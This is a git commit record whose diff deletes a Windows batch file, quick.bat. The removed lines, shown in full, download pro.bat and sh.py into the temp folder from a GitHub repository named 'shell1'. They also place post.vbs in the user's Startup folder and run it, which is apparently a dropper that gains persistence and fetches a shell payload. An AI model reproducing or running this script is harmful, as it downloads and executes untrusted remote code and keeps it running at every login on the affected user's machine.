bf0288b8f68981bb72696eec77377f3eb82238ef
Omar Samy <osamy7592@gmail.com>
2024-05-07 05:00:30 +0300

    Delete quick.bat

--- quick.bat
+++
@@ -1,6 +0,0 @@
-@echo off
-curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/pro.bat -o %temp%\pro.bat
-curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/sh.py -o %temp%\sh.py
-curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/post.vbs -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\post.vbs"
-
-call "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\post.vbs"
